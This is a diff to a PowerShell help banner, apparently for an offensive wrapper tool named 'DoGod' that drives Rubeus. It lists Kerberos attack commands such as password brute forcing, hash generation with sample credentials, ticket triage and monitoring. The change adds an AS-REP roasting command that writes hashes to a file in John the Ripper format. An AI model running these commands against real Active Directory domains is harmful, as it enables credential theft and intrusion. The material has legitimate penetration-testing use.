@@ -46,6 +46,7 @@ Write-Host -ForegroundColor Red ' DoGod -Rubeus -Command "brute /password:user@1
 Write-Host -ForegroundColor Red ' DoGod -Rubeus -Command "hash /user:SasyUser /domain:mitnick.in /password:user@123"'
 Write-Host -ForegroundColor Red ' DoGod -Rubeus -Command "triage"'
 Write-Host -ForegroundColor Red ' DoGod -Rubeus -Command "monitor /interval:10"'
+Write-Host -ForegroundColor Red ' DoGod -Rubeus -Command "asreproast /format:john /outfile:hash.txt"'
 Write-Host ''
 Write-Host -ForegroundColor Yellow ' For help please type: DoGod on CLI!'
 @'
